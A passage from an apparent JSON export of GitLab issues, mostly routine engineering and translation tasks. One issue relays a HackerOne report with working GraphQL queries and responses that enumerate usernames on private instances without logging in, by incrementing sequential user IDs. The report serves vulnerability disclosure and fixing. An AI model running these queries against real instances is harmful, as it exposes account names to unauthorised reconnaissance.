https://gitlab.com/gitlab-com/runbooks/-/merge_requests/4384. Before this change, we were meeting the expected thresholds.\n\n## Issue Outcome\n\nThis issue is meant to investigate why we are not within the acceptable range. As part of this investigation, we should identify specific endpoints that are having the greatest impact on our error budget. Once they have been identified, we should create issues to fix the problem(s). The fix may be a combination of adjusting the categories/thresholds where appropriate and/or looking into the performance of endpoints and fixing the cause of the slow responses. \n\nLonger-term we may need to revisit a number of endpoints if we are thinking about changing the definitions of the \"high\", \"default\", or \"low\" thresholds.","state":"closed","created_at":"2022-03-02T22:05:45.955Z","updated_at":"2022-04-13T14:05:27.942Z","closed_at":"2022-04-07T12:27:45.397Z","closed_by":{"id":4058309,"username":"mnohr","name":"Matt Nohr","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f2b70c7a75fd0a15ef789d4b1e620449?s=80\u0026d=identicon","web_url":"https://gitlab.com/mnohr"},"labels":["Stretch","backend","bug::performance","devops::create","group::code review","section::dev","severity::3","type::bug","workflow::in dev"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":4058309,"username":"mnohr","name":"Matt Nohr","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f2b70c7a75fd0a15ef789d4b1e620449?s=80\u0026d=identicon","web_url":"https://gitlab.com/mnohr"}],"author":{"id":4058309,"username":"mnohr","name":"Matt Nohr","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f2b70c7a75fd0a15ef789d4b1e620449?s=80\u0026d=identicon","web_url":"https://gitlab.com/mnohr"},"type":"ISSUE","assignee":{"id":4058309,"username":"mnohr","name":"Matt Nohr","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f2b70c7a75fd0a15ef789d4b1e620449?s=80\u0026d=identicon","web_url":"https://gitlab.com/mnohr"},"user_notes_count":21,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354222","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354222","notes":"https://gitlab.com/api/v4/projects/278964/issues/354222/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354222/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354222","relative":"#354222","full":"gitlab-org/gitlab#354222"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103989917,"iid":354220,"project_id":278964,"title":"Update translations levels (Apr 2022)","description":"## Introduction\n\nWith the implementation of the feature to show the [translation coverage](https://gitlab.com/gitlab-org/gitlab/-/issues/328430) in the language selection dropdown, the translation levels need to be updated on a monthly cadence. \n\n## Proposal\n\nOnce the monthly merge of the new translations is complete, update the translation levels [data](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/i18n.rb#L43) from Crowdin.\n\n## Documentation\n\n* https://docs.gitlab.com/ee/development/i18n/merging_translations.html#manually-update-the-translation-levels\n\n#### ToDo\n* [x] After cloning: update Title, set Milestone, Due date (15th), Related to previous month's issue.\n* [x] After the 1st of the month: assign to yourself, set ~2526320 \n* [x] Complete the [regular monthly merge](https://gitlab.com/groups/gitlab-org/-/epics/3571) of translations from Crowdin.\n* [x] Get the translation levels (% approved words) from [Crowdin](https://crowdin.com/project/gitlab-ee).\n* [x] Create an MR to update the translation levels [data](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/i18n.rb#L43).\n* [x] Associate that MR to this issue.\n* [x] Complete the MR.\n* [x] When done, clone [this template issue](https://gitlab.com/gitlab-org/gitlab/-/issues/349815) for the next milestone.","state":"closed","created_at":"2022-03-02T21:41:07.191Z","updated_at":"2022-04-18T10:57:33.882Z","closed_at":"2022-04-05T07:36:48.340Z","closed_by":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"labels":["Category:Internationalization","Deliverable","Next Up","backend","devops::manage","estimation::completed","group::import","milestone::p2","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delalić","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-04-15","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354220","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":8,"completed_count":8},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"8 of 8 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354220","notes":"https://gitlab.com/api/v4/projects/278964/issues/354220/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354220/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354220","relative":"#354220","full":"gitlab-org/gitlab#354220"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3571,"epic":{"id":67045,"iid":3571,"title":"Regular i18n translation merges","url":"/groups/gitlab-org/-/epics/3571","group_id":9970,"human_readable_timestamp":"\u003cstrong\u003e1033\u003c/strong\u003e days elapsed"},"iteration":null,"health_status":null},{"id":103989771,"iid":354219,"project_id":278964,"title":"Merge i18n translations (Apr 2022)","description":"Merge the latest i18n translations from Crowdin on a monthly cadence.\n\nDocumentation available here: https://docs.gitlab.com/ee/development/i18n/merging_translations.html\n\n#### ToDo\n* [x] After cloning: update Title, set Milestone, Due date (15th), Related to previous month's issue.\n* [x] After the 1st of the month: assign to yourself, set ~2526320 \n* [x] If needed, configure the [GitLab-Crowdin integration](https://docs.gitlab.com/ee/development/i18n/merging_translations.html#recreate-the-gitlab-integration-in-crowdin)\n* [x] Kick off a sync from [Crowdin](https://crowdin.com/project/gitlab-ee/apps/system/gitlab)\n* [x] Find the [MR](https://gitlab.com/gitlab-org/gitlab/-/merge_requests?scope=all\u0026utf8=%E2%9C%93\u0026state=opened\u0026author_username=gitlab-crowdin-bot) created by @gitlab-crowdin-bot and associate it with this issue\n* [x] Complete the MR\n* [x] Update the translation levels [data](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/i18n.rb#L43) with the latest numbers. (Find the issue [here](https://gitlab.com/groups/gitlab-org/-/epics/3571))\n* [x] When done, clone [this template issue](https://gitlab.com/gitlab-org/gitlab/-/issues/339980) for the next milestone.","state":"closed","created_at":"2022-03-02T21:37:45.182Z","updated_at":"2022-04-18T10:57:33.935Z","closed_at":"2022-04-03T09:07:38.138Z","closed_by":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"labels":["Category:Internationalization","Deliverable","Next Up","backend","devops::manage","estimation::completed","group::import","milestone::p2","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delalić","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-04-15","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354219","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":8,"completed_count":8},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"8 of 8 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354219","notes":"https://gitlab.com/api/v4/projects/278964/issues/354219/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354219/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354219","relative":"#354219","full":"gitlab-org/gitlab#354219"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3571,"epic":{"id":67045,"iid":3571,"title":"Regular i18n translation merges","url":"/groups/gitlab-org/-/epics/3571","group_id":9970,"human_readable_timestamp":"\u003cstrong\u003e1033\u003c/strong\u003e days elapsed"},"iteration":null,"health_status":null},{"id":103987524,"iid":354214,"project_id":278964,"title":"Geo migration specs are not running in CI","description":"As we found out in https://gitlab.com/gitlab-org/gitlab/-/issues/352150#note_860512411, because we don't have a `rspec-ee migration geo` job, the specs in `ee/spec/migrations/geo` didn't run in CI for a long while.\n\nCopying my comment from the thread:\n\nI took a look at https://gitlab.com/gitlab-org/gitlab/-/jobs/2154831080 for example, and I can see:\n\n```\nKNAPSACK_TEST_FILE_PATTERN: {ee/}spec/{bin,channels,config,db,dependencies,elastic,elastic_integration,experiments,events,factories,finders,frontend,graphql,haml_lint,helpers,initializers,javascripts,lib,metrics_server,models,policies,presenters,rack_servers,replicators,routing,rubocop,scripts,serializers,services,sidekiq,sidekiq_cluster,spam,support_specs,tasks,uploaders,validators,views,workers,tooling}{,/**/}*_spec.rb\n```\n\nThis comes [from `scripts/rspec_helpers.sh`](https://gitlab.com/gitlab-org/gitlab/blob/50c2445e52dfda68c03f9301750406310d8419fa/scripts/rspec_helpers.sh#L250), more specifically executing `./tooling/quality/test_level.rb` with the job name, and we only have `rspec-ee unit|integration|system geo` jobs, but no `migration` one, despite not excluding the migrations specifically as we do in regular tests (i.e. with `--tag ~level:migration`), which results in no tests in `ee/spec/migrations/geo/*` running.\n\nI think we want to add an extra `rspec-ee migration geo` job in order to get this working.\n\n@kwiebers opened an initial MR at https://gitlab.com/gitlab-org/gitlab/-/merge_requests/82039 for this.","state":"closed","created_at":"2022-03-02T20:41:14.477Z","updated_at":"2022-05-10T16:07:00.976Z","closed_at":"2022-05-05T11:42:07.629Z","closed_by":{"id":4375373,"username":"cat","name":"Catalin Irimie","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fd4f68fe3a123d56ac4413dc960b7559?s=80\u0026d=identicon","web_url":"https://gitlab.com/cat"},"labels":["Engineering Productivity","ep::pipeline","maintenance::pipelines","priority::2","testing::usability","type::maintenance","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"}],"author":{"id":4375373,"username":"cat","name":"Catalin Irimie","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fd4f68fe3a123d56ac4413dc960b7559?s=80\u0026d=identicon","web_url":"https://gitlab.com/cat"},"type":"ISSUE","assignee":{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354214","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354214","notes":"https://gitlab.com/api/v4/projects/278964/issues/354214/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354214/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354214","relative":"#354214","full":"gitlab-org/gitlab#354214"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103986005,"iid":354209,"project_id":278964,"title":"Unauthenticated user can enumerate instance users (incomplete fix of CVE-2021-4191 in Security Release 14.8.2)","description":"**[HackerOne report #1494149](https://hackerone.com/reports/1494149)** by `jimeno` on 2022-02-28, assigned to `@ankelly`:\n\n[Report](#report) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n#####  Summary\n\n==NOTE==: I know and understand the issue being reported here is marked as Out of Scope. However, I'm linking to the most recent GitLab release notes (a security release) where the team clearly acknowledges this represents a security risk and has intended to fix it.\n\n\u003e Thanks mungsul and todb-r7 for reporting this vulnerability through our HackerOne bug bounty program.\n\nGitLab `14.8.2` Critical security [release notes](https://about.gitlab.com/releases/2022/02/25/critical-security-release-gitlab-14-8-2-released/#unauthenticated-user-enumeration-on-graphql-api) says:\n\n\u003e **Unauthenticated user enumeration on GraphQL API**  \n\u003e   \n\u003e An issue has been discovered in GitLab CE/EE affecting all versions starting from 13.0 and all versions starting from 14.4 before 14.8. Private GitLab instances with restricted sign-ups may be vulnerable to user enumeration by unauthenticated users through the GraphQL API. This is a medium severity issue (`CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N, 5.3`). It is now mitigated in the latest release and is assigned CVE-2021-4191.  \n\u003e   \n\u003e Thanks mungsul and todb-r7 for reporting this vulnerability through our HackerOne bug bounty program.\n\n\nUnfortunately, the patch GitLab made for this (see [here](https://gitlab.com/gitlab-org/gitlab/-/commit/8c41b4ca5046f1d413d2bb9e12afb6588c102837.diff)) isn't complete and becomes useless given the fact that GitLab global identifiers `gid://gitlab/OBJECT/IDENTIFIER` are unique, sequential decimal numbers. This allows unauthenticated attackers to continue enumerating users on private GitLab instances where signup is disabled.\n\n**Note for the HackerOne analysts:** by reading the hackerone.com/gitlab policy it says username enumeration without any further impact is Out of Scope. However, based on the linked official GitLab security release notes, they seem to have accepted unauthenticated username enumeration as Medium (5.3 score). Please, **do not** close this as N/A since it's clear GitLab ignored this line on their policy. Of course, I'll be happy to self-close this as N/A if GitLab team confirms this won't be accepted/is considered Out of Scope.\n\n\u003e User and project enumeration/path disclosure unless an additional impact can be demonstrated\n\n#####  Steps to reproduce\n\n######  Setup\n\nRun a 14.8.2 or more recent GitLab instance where public singup is **disabled**.\n\n######  Attack\n\n1. As an unauthenticated user, browse to the GraphQL console at `https://YOUR-INSTANCE/-/graphql-explorer`.  \n2. First, we're going to verify the previously applied (14.8.2) fix works by running the following query:\n\n```graphql  \nquery x {  \n  users {  \n    edges {  \n      node {  \n        id  \n      }  \n    }  \n  }  \n}\n```\n\n3. Notice how the response confirms a fix was made for the previous report.\n\n```json  \n{\n  \"data\": {  \n    \"users\": null  \n  },  \n  \"errors\": [  \n    {  \n      \"message\": \"The resource that you are attempting to access does not exist or you don't have permission to perform this action\",  \n      \"locations\": [  \n        {  \n          \"line\": 2,  \n          \"column\": 3  \n        }  \n      ],  \n      \"path\": [  \n        \"users\"  \n      ]  \n    }  \n  ]  \n}\n```\n\n4. Run the following query (note GitLab object identifiers follow a sequential order, one just has to increment the object ID by 1 in order to get the next username) and notice usernames can still be enumerated.\n\n```graphql  \nquery x {  \n  user(id: \"gid://gitlab/User/1\") {  \n    username  \n  }  \n}\n```\n\n```json  \n{\n  \"data\": {  \n    \"user\": {  \n      \"username\": \"root\"  \n    }  \n  }  \n}\n```\n\n#####  Impact\n\nUsername enumeration on private instances where public signup is disabled. Exact same impact the CVE you recently issued: [CVE-2021-4191](https://about.gitlab.com/releases/2022/02/25/critical-security-release-gitlab-14-8-2-released/#unauthenticated-user-enumeration-on-graphql-api).\n\n#####  Examples\n\nN/A.\n\n#####  What is the current *bug* behavior?\n\nUnauthenticated user can enumerate instance users when public sin up is disabled.\n\n#####  What is the expected *correct* behavior?\n\nUnauthenticated user can't enumerate instance users when public sin up is disabled.\n\n\n#####  Relevant logs and/or screenshots\n\nN/A\n\n#####  Output of checks\n\nThis bug happens on GitLab.com\n\n######  Results of GitLab environment info\n\n```console  \nroot@rigel:/# gitlab-rake gitlab:env:info\n\nSystem information  \nSystem:\t\t  \nProxy:\t\tno  \nCurrent User:\tgit  \nUsing RVM:\tno  \nRuby Version:\t2.7.5p203  \nGem Version:\t3.1.4  \nBundler Version:2.1.4  \nRake Version:\t13.0.6  \nRedis Version:\t6.2.6  \nSidekiq Version:6.4.0  \nGo Version:\tunknown\n\nGitLab information  \nVersion:\t14.8.2-ee  \nRevision:\t20a7fdf52c9  \nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter:\tPostgreSQL  \nDB Version:\t12.7  \nURL:\t\thttps://rigel.wiki  \nHTTP Clone URL:\thttps://rigel.wiki/some-group/some-project.git  \nSSH Clone URL:\tgit@rigel.wiki:some-group/some-project.git  \nElasticsearch:\tno  \nGeo:\t\tno  \nUsing LDAP:\tno  \nUsing Omniauth:\tyes  \nOmniauth Providers: auth0\n\nGitLab Shell  \nVersion:\t13.23.2  \nRepository storage paths:  \n- default: \t/var/opt/gitlab/git-data/repositories  \nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell  \n```\n\n####  Impact\n\nUsername enumeration on private instances where public signup is disabled. Exact same impact the CVE you recently issued: [CVE-2022-0549](https://about.gitlab.com/releases/2022/02/25/critical-security-release-gitlab-14-8-2-released/#unauthenticated-user-enumeration-on-graphql-api).\n\n## Proposal\n\nFix ideas:\n\n1. Require authentication for queries identified as vulnerable to user enumeration in the [thread below](https://gitlab.com/gitlab-org/gitlab/-/issues/354209#note_860997212).\n1. [Restrict Public level visibility](https://docs.gitlab.com/ee/user/admin_area/settings/visibility_and_access_controls.html#restrict-visibility-levels) by default? That would take care of issues like these wholesale.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues","state":"closed","created_at":"2022-03-02T20:02:20.986Z","updated_at":"2022-07-12T08:42:41.052Z","closed_at":"2022-06-14T08:24:30.600Z","closed_by":{"id":9043659,"username":"rshambhuni","name":"Rohit Shambhuni","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9043659/avatar.png","web_url":"https://gitlab.com/rshambhuni"},"labels":["Category:Authentication and Authorization","Deliverable","HackerOne","Weakness::CWE-284","backend","bug::vulnerability","candidate::14.10","devops::manage","group::authentication and authorization","priority::2","section::dev","security","severity::3","type::bug","workflow::production"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":1315784,"username":"ifarkas","name":"Imre Farkas","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b4dcfa5185b8513751b447d76b069bf6?s=80\u0026d=identicon","web_url":"https://gitlab.com/ifarkas"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":1315784,"username":"ifarkas","name":"Imre Farkas","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b4dcfa5185b8513751b447d76b069bf6?s=80\u0026d=identicon","web_url":"https://gitlab.com/ifarkas"},"user_notes_count":28,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-05-26","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354209","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354209","notes":"https://gitlab.com/api/v4/projects/278964/issues/354209/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354209/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354209","relative":"#354209","full":"gitlab-org/gitlab#354209"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103985274,"iid":354205,"project_id":278964,"title":"Banner broadcast messages not showing correctly in .com purchase flow","description":"### Summary\n\nIn the purchase flow, banner broadcast messages are not in the right position and they are much larger than they should be.\n\n### Steps to reproduce\n\n1. Create a [banner broadcast message](https://docs.gitlab.com/ee/user/admin_area/broadcast_messages.html#banners) (you will need to be an admin to do so).\n1. Navigate to a group \u003e Billing \u003e Upgrade.\n1. Observe the banner being displayed incorrectly on the checkout page.\n\n### Example Project\n\nThere is currently a banner broadcast message live on staging that could be used to reproduce.\n\n### What is the current *bug* behavior?\n\nThe banner broadcast messages are not in the right position and they are much larger than they should be.\n\n### What is the expected *correct* behavior?\n\nThe banner broadcast messages should be shown across the top of the screen below the nav bar, just as they are on other pages.\n\n### Relevant logs and/or screenshots\n\n| How banner messages should look | How they look in the purchase flow |\n| ------ | ------ |\n| ![Screen_Shot_2022-03-02_at_1.35.00_PM](/uploads/986841bfdeddc52f7bb37198865b50f8/Screen_Shot_2022-03-02_at_1.35.00_PM.png) |![Screen_Shot_2022-03-02_at_1.35.17_PM](/uploads/0f45982cf4de04a91d4bdceb4119b18e/Screen_Shot_2022-03-02_at_1.35.17_PM.png) |\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e","state":"closed","created_at":"2022-03-02T19:40:13.710Z","updated_at":"2022-03-09T07:46:01.516Z","closed_at":"2022-03-09T07:46:01.495Z","closed_by":{"id":10216431,"username":"syarynovskyi","name":"Serhii Yarynovskyi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10216431/avatar.png","web_url":"https://gitlab.com/syarynovskyi"},"labels":["Unplanned","devops::growth","frontend","group::acquisition","section::growth","type::bug","workflow::ready for review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":10216431,"username":"syarynovskyi","name":"Serhii Yarynovskyi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10216431/avatar.png","web_url":"https://gitlab.com/syarynovskyi"}],"author":{"id":4377833,"username":"esybrant","name":"Emily Sybrant","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4377833/avatar.png","web_url":"https://gitlab.com/esybrant"},"type":"ISSUE","assignee":{"id":10216431,"username":"syarynovskyi","name":"Serhii Yarynovskyi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10216431/avatar.png","web_url":"https://gitlab.com/syarynovskyi"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354205","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354205","notes":"https://gitlab.com/api/v4/projects/278964/issues/354205/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354205/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354205","relative":"#354205","full":"gitlab-org/gitlab#354205"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103981927,"iid":354200,"project_id":278964,"title":"Static Integration DSL: app/models/integrations/unify_circuit.rb","description":"Convert app/models/integrations/unify_circuit.rb to use the static field DSL introduced","state":"closed","created_at":"2022-03-02T18:11:44.774Z","updated_at":"2022-12-13T22:33:38.325Z","closed_at":"2022-12-13T22:33:38.314Z","closed_by":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"labels":["Category:Integrations","[deprecated] Accepting merge requests","devops::manage","group::integrations","section::dev","type::maintenance","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354200","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354200","notes":"https://gitlab.com/api/v4/projects/278964/issues/354200/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354200/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354200","relative":"#354200","full":"gitlab-org/gitlab#354200"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7652,"epic":{"id":454800,"iid":7652,"title":"Integrations Static DSL","url":"/groups/gitlab-org/-/epics/7652","group_id":9970},"iteration":null,"health_status":null},{"id":103981916,"iid":354198,"project_id":278964,"title":"Static Integration DSL: app/models/integrations/slack.rb","description":"Convert app/models/integrations/slack.rb to use the static field DSL introduced","state":"closed","created_at":"2022-03-02T18:11:33.690Z","updated_at":"2022-12-13T22:33:38.155Z","closed_at":"2022-12-13T22:33:38.141Z","closed_by":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"labels":["Category:Integrations","[deprecated] Accepting merge requests","backend","devops::manage","group::integrations","section::dev","type::maintenance","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":3614858,"username":"alexkalderimis","name":"Alex 